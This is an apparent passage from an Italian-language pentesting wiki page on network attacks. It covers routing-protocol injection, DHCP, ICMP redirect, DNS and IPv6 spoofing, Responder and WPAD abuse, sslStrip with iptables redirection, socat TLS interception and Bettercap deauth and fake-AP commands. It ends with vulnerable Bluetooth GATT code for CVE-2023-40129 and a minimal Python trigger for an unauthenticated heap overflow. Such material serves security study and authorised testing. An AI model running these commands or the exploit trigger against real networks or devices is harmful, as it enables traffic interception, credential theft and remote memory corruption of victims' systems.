Esistono tre versioni del Routing Information Protocol (RIP): RIP, RIPv2 e RIPng. I datagrammi vengono inviati ai peer tramite la porta 520 usando UDP da RIP e RIPv2, mentre RIPng invia datagrammi in broadcast alla porta UDP 521 tramite multicast IPv6. Il supporto per l'autenticazione MD5 è stato introdotto da RIPv2. RIPng, invece, non include l'autenticazione nativa; si affida invece agli header opzionali IPsec AH e ESP in IPv6.

- **RIP e RIPv2:** la comunicazione avviene tramite datagrammi UDP sulla porta 520.
- **RIPng:** utilizza la porta UDP 521 per il broadcast dei datagrammi tramite multicast IPv6.

Nota che RIPv2 supporta l'autenticazione MD5 mentre RIPng non include autenticazione nativa, facendo affidamento su IPsec AH e ESP in IPv6.

### EIGRP Attacks

**EIGRP (Enhanced Interior Gateway Routing Protocol)** è un protocollo di routing dinamico. **È un protocollo distance-vector.** Se non è presente **autenticazione** e non vengono configurate interfacce passive, un **intruso** può interferire con il routing EIGRP e causare **avvelenamento delle tabelle di routing**. Inoltre, la rete EIGRP (in altre parole, l'autonomous system) **è flat e non ha segmentazione in zone**. Se un **attaccante inietta una route**, è probabile che questa route si **propaghi** attraverso il sistema autonomo EIGRP.

Per attaccare un sistema EIGRP è necessario **stabilire un neighborship con un router EIGRP legittimo**, il che apre molte possibilità, dalla ricognizione di base a varie iniezioni.

[**FRRouting**](https://frrouting.org/) permette di implementare **un virtual router che supporta BGP, OSPF, EIGRP, RIP e altri protocolli.** Basta deployarlo sul sistema dell'attaccante e si può effettivamente fingere di essere un router legittimo nel dominio di routing.


{{#ref}}
eigrp-attacks.md
{{#endref}}

[**Coly**](https://code.google.com/p/coly/) ha capacità di intercettare broadcast EIGRP (Enhanced Interior Gateway Routing Protocol). Permette anche l'iniezione di pacchetti, che può essere utilizzata per alterare le configurazioni di routing.

### OSPF

Nel protocollo Open Shortest Path First (OSPF) **l'autenticazione MD5 è comunemente impiegata per garantire comunicazioni sicure tra i router**. Tuttavia, questa misura di sicurezza può essere compromessa usando strumenti come Loki e John the Ripper. Questi strumenti sono in grado di catturare e crackare gli hash MD5, esponendo la chiave di autenticazione. Una volta ottenuta questa chiave, può essere usata per introdurre nuove informazioni di routing. Per configurare i parametri di route e impostare la chiave compromessa, si utilizzano rispettivamente le schede _Injection_ e _Connection_.

- **Cattura e cracking degli hash MD5:** strumenti come Loki e John the Ripper vengono usati per questo scopo.
- **Configurazione dei parametri di route:** avviene tramite la scheda _Injection_.
- **Impostazione della chiave compromessa:** la chiave è configurata nella scheda _Connection_.

### Other Generic Tools & Sources

- [**Above**](https://github.com/c4s73r/Above): Tool to scan network traffic and find vulnerabilities
- You can find some **more information about network attacks** [**here**](https://github.com/Sab0tag3d/MITM-cheatsheet).

## **Spoofing**

L'attaccante configura tutti i parametri di rete (GW, IP, DNS) del nuovo membro della rete inviando risposte DHCP false.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

Consulta la [previous section](#arp-spoofing).

### ICMPRedirect

ICMP Redirect consiste nell'inviare un ICMP packet type 1 code 5 che indica che the attacker è la via migliore per raggiungere un IP. Quando the victim vuole contattare l'IP, invierà il packet attraverso the attacker.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

L'attacker risolverà alcuni (o tutti) dei domini richiesti dalla victim.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**Configurare il proprio DNS con dnsmasq**
```bash
apt-get install dnsmasq
echo "addn-hosts=dnsmasq.hosts" > dnsmasq.conf
echo "127.0.0.1   domain.example.com" > dnsmasq.hosts
sudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### Gateway locali

Spesso esistono percorsi multipli verso sistemi e network. Dopo aver costruito una lista di indirizzi MAC all'interno della rete locale, usa _gateway-finder.py_ per identificare gli host che supportano l'inoltro IPv4.

<details>
<summary>Esempio d'uso di gateway-finder</summary>
```bash
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
</details>


### [Spoofing LLMNR, NBT-NS, and mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Per la risoluzione dei nomi locali quando le query DNS non vanno a buon fine, i sistemi Microsoft si affidano a **Link-Local Multicast Name Resolution (LLMNR)** e al **NetBIOS Name Service (NBT-NS)**. Analogamente, le implementazioni **Apple Bonjour** e **Linux zero-configuration** utilizzano **Multicast DNS (mDNS)** per scoprire i sistemi all'interno di una rete. A causa della natura non autenticata di questi protocolli e del loro funzionamento su UDP, con messaggi in broadcast, possono essere sfruttati da attaccanti che mirano a reindirizzare gli utenti verso servizi malevoli.

Puoi impersonare servizi che vengono cercati dagli host usando Responder per inviare risposte false.\
Leggi qui maggiori informazioni su [how to Impersonate services with Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

I browser comunemente impiegano il protocollo Web Proxy Auto-Discovery (WPAD) per acquisire automaticamente le impostazioni del proxy. Questo comporta il recupero delle informazioni di configurazione da un server, tipicamente tramite un URL come "http://wpad.example.org/wpad.dat". La scoperta di questo server da parte dei client può avvenire tramite diversi meccanismi:

- Tramite **DHCP**, dove la scoperta è facilitata dall'uso di una voce speciale con codice 252.
- Tramite **DNS**, che comporta la ricerca di un hostname etichettato _wpad_ all'interno del dominio locale.
- Tramite **Microsoft LLMNR e NBT-NS**, che sono meccanismi fallback usati nei casi in cui le lookup DNS non vengano risolte.

Lo strumento Responder sfrutta questo protocollo comportandosi come un **malicious WPAD server**. Utilizza DHCP, DNS, LLMNR e NBT-NS per indurre i client a connettersi a esso. Per approfondire come i servizi possono essere impersonati usando Responder [check this](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing SSDP and UPnP devices](spoofing-ssdp-and-upnp-devices.md)

Puoi offrire diversi servizi nella rete per cercare di **ingannare un utente** affinché inserisca delle **credenziali in chiaro**. **Maggiori informazioni su questo attacco in** [**Spoofing SSDP and UPnP Devices**](spoofing-ssdp-and-upnp-devices.md)**.**

### IPv6 Neighbor Spoofing

Questo attacco è molto simile ad ARP Spoofing ma nel mondo IPv6. Puoi far credere alla vittima che l'IPv6 del GW abbia il MAC dell'attaccante.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 Router Advertisement Spoofing/Flooding

Alcuni OS configurano di default il gateway dai pacchetti RA inviati nella rete. Per dichiarare l'attaccante come router IPv6 puoi usare:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP spoofing

Per impostazione predefinita alcuni OS cercano di configurare il DNS leggendo un pacchetto DHCPv6 nella rete. Quindi, un attacker potrebbe inviare un pacchetto DHCPv6 per configurarsi come DNS. Il DHCP fornisce inoltre un IPv6 alla victim.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (fake page and JS code injection)

## Internet Attacks

### sslStrip

Fondamentalmente quello che fa questo attacco è che, nel caso in cui l'**user** provi ad **access** una pagina **HTTP** che sta **redirecting** alla versione **HTTPS**, **sslStrip** will **maintain** a **HTTP connection with** the **client and** a **HTTPS connection with** the **server**, così sarà in grado di **sniff** la connessione in **plain text**.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
Maggiori informazioni [here](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ and dns2proxy per bypassare HSTS

La **differenza** tra **sslStrip+ and dns2proxy** rispetto a **sslStrip** è che **reindirizzeranno** per esempio _**www.facebook.com**_ **a** _**wwww.facebook.com**_ (nota la **"w"** **in più**) e imposteranno **l'indirizzo di questo dominio come l'IP dell'attaccante**. In questo modo, il **client** si **connetterà** a _**wwww.facebook.com**_ **(l'attaccante)** ma dietro le quinte **sslstrip+** manterrà la **connessione reale** via https con **www.facebook.com**.

L'**obiettivo** di questa tecnica è **evitare HSTS** perché _**wwww**.facebook.com_ **non** verrà salvato nella **cache** del browser, quindi il browser verrà ingannato a eseguire **facebook authentication in HTTP**.\
Nota che per eseguire questo attacco la vittima deve cercare di accedere inizialmente a [http://www.faceook.com](http://www.faceook.com) e non via https. Questo può essere fatto modificando i link all'interno di una pagina http.

Maggiori informazioni [here](https://www.bettercap.org/legacy/#hsts-bypass), [here](https://www.slideshare.net/Fatuo__/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) e [here](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip or sslStrip+ doesn't work anymore. This is because there are HSTS rules presaved in the browsers, so even if it's the first time that a user access an "important" domain he will access it via HTTPS. Also, notice that the presaved rules and other generated rules can use the flag** [**`includeSubdomains`**](https://hstspreload.appspot.com) **so the** _**wwww.facebook.com**_ **example from before won't work anymore as** _**facebook.com**_ **uses HSTS with `includeSubdomains`.**

TODO: easy-creds, evilgrade, metasploit, factory

## TCP listen sulla porta
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL: ascolto su una porta

#### Generare chiavi e certificato autofirmato
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### Ascoltare usando un certificato
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### Ascolta usando un certificato e reindirizza agli host
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
A volte, se il client verifica che la CA sia valida, puoi **servire un certificate di un altro hostname firmato da una CA**.\
Un altro test interessante è servire un c**ertificate del hostname richiesto ma self-signed**.

Altre cose da testare sono provare a firmare il certificate con un certificate valido che non sia una CA valida. Oppure usare la public key valida, forzare l'uso di un algoritmo come diffie hellman (uno che non necessita di decifrare nulla con la vera private key) e, quando il client richiede una probe della vera private key (come un hash), inviare una probe falsa e aspettarsi che il client non la verifichi.

## Bettercap

<details>
<summary>Comandi comuni di Bettercap</summary>
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
</details>


### Note sulla scoperta attiva

Tieni conto che quando un pacchetto UDP viene inviato a un dispositivo che non possiede la porta richiesta viene inviato un messaggio ICMP (Port Unreachable).

### **ARP discover**

I pacchetti ARP sono usati per scoprire quali IP sono in uso all'interno della rete. Il PC deve inviare una richiesta per ogni possibile indirizzo IP e risponderanno solo quelli che sono effettivamente in uso.

### **mDNS (multicast DNS)**

Bettercap invia una richiesta MDNS (ogni X ms) chiedendo per **\_services\_.dns-sd.\_udp.local**; la macchina che vede questo pacchetto solitamente risponde a questa richiesta. Poi cerca solo le macchine che rispondono a "services".

**Strumenti**

- Avahi-browser (--all)
- Bettercap (net.probe.mdns)
- Responder

### **NBNS (NetBios Name Server)**

Bettercap invia pacchetti broadcast alla porta 137/UDP chiedendo per il nome "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA".

### **SSDP (Simple Service Discovery Protocol)**

Bettercap invia pacchetti SSDP in broadcast alla ricerca di ogni tipo di servizio (UDP Port 1900).

### **WSD (Web Service Discovery)**

Bettercap invia pacchetti WSD in broadcast alla ricerca di servizi (UDP Port 3702).


## Attacchi Bluetooth (L2CAP/ATT/GATT)

- Android Fluoride espone servizi su L2CAP PSMs (es., SDP 0x0001, RFCOMM 0x0003, BNEP 0x000F, AVCTP 0x0017/0x001B, AVDTP 0x0019, ATT/GATT 0x001F). I servizi si registrano tramite:
```c
uint16_t L2CA_Register2(uint16_t psm, const tL2CAP_APPL_INFO& p_cb_info,
bool enable_snoop, tL2CAP_ERTM_INFO* p_ertm_info,
uint16_t my_mtu, uint16_t required_remote_mtu,
uint16_t sec_level);
```
- Il framework BlueBlue consente Scapy-based L2CAP/ATT crafting (basato su BlueBorne l2cap_infra). Esempio:
```python
acl  = ACLConnection(src_bdaddr, dst_bdaddr, auth_mode='justworks')
gatt = acl.l2cap_connect(psm=PSM_ATT, mtu=672)
gatt.send_frag(p8(GATT_READ)+p16(1234))
print(gatt.recv())
```
- CVE-2023-40129 (Fluoride GATT): integer underflow nel Read Multiple Variable response builder può causare un heap overflow di ~64KB quando l'MTU tronca un elemento a lunghezza variabile ma il campo di lunghezza +2 non viene considerato.

<details>
<summary>Causa principale (GATT Read Multiple Variable)</summary>
```c
static void build_read_multi_rsp(tGATT_SR_CMD* p_cmd, uint16_t mtu) {
uint16_t ii, total_len, len; uint8_t* p; bool is_overflow=false;
len = sizeof(BT_HDR) + L2CAP_MIN_OFFSET + mtu;
BT_HDR* p_buf = (BT_HDR*)osi_calloc(len); p_buf->offset=L2CAP_MIN_OFFSET;
p = (uint8_t*)(p_buf + 1) + p_buf->offset; *p++ = GATT_RSP_READ_MULTI_VAR;
p_buf->len=1;
for (ii=0; ii<p_cmd->multi_req.num_handles; ii++) {
tGATTS_RSP* p_rsp = ...; // dequeued
if (p_rsp) {
total_len = (p_buf->len + p_rsp->attr_value.len);
if (p_cmd->multi_req.variable_len) total_len += 2;
if (total_len > mtu) {
len = p_rsp->attr_value.len - (total_len - mtu); // BUG: ignores +2
is_overflow = true;
} else { len = p_rsp->attr_value.len; }
if (p_cmd->multi_req.variable_len) { UINT16_TO_STREAM(p, len); p_buf->len += 2; }
memcpy(p, p_rsp->attr_value.value, len); // heap overflow
if (!is_overflow) p += len; p_buf->len += len; if (is_overflow) break;
}
}
}
```
- Sulle voci a lunghezza variabile, il percorso di overflow sottrae solo (total_len - mtu), ignorando il campo di lunghezza +2, quindi len va in underflow (p.es., 0xFFFE) e memcpy scrive ~64KB oltre la fine del buffer.
</details>

- Trigger minimale non autenticato (MTU piccolo forza l'underflow sul 4° attributo):
```python
# GATT_REQ_READ_MULTI_VAR (0x20), MTU=55
acl  = ACLConnection(interface, bdaddr)
gatt = acl.l2cap_connect(psm=PSM_ATT, mtu=55)
pkt  = b'\x20'  # opcode
pkt += p16(9); pkt += p16(9); pkt += p16(9); pkt += p16(9)
gatt.send(pkt)
# On 4th insert: p_buf->len=55 (1 + 3*(16+2)), total_len=73 -> len=16-(73-55)=-2 -> ~64KB overwrite
```
### Telecomunicazioni / Mobile-Core (GTP) Exploitation


{{#ref}}
telecom-network-exploitation.md
{{#endref}}

## Riferimenti

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- **Network Security Assessment: Know Your Network (3rd edition)**
- **Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things. By Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
- [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- [Paint it blue: Attacking the bluetooth stack (Synacktiv)](https://www.synacktiv.com/en/publications/paint-it-blue-attacking-the-bluetooth-stack)
- [BlueBorne L2CAP testing infra (l2cap_infra)](https://github.com/ArmisSecurity/blueborne/tree/master/l2cap_infra)



{{#include ../../banners/hacktricks-training.md}}
